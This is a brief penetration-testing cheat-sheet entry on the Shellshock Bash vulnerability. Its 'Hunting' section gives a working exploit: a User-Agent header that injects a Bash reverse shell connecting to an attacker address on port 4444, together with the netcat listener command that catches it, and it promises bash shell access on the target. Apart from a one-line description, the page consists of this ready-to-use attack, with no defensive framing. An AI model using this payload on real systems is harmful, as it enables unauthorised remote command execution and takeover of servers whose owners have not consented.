# Shellshock

Shellshock is a group of security vulnerabilities found in the _Bourne-Again_ shell (_Bash_), which allowed attackers to execute aribitrary commands on a server without authentication against the machine or web application.

## Hunting

Burp Suite -> Proxy -> Intercept ON

Change _User-Agent_ header to:

```
User-Agent: () { :;};echo -e "\r\n$(/bin/bash -i >& /dev/tcp/10.0.0.10/4444 0>&1)"
```

Then at your terminal prompt:

```
nc -lvp 4444
$ Listening on [any] 4444...
```

Then let the request pass through and your terminal will be presented with a bash shell access.
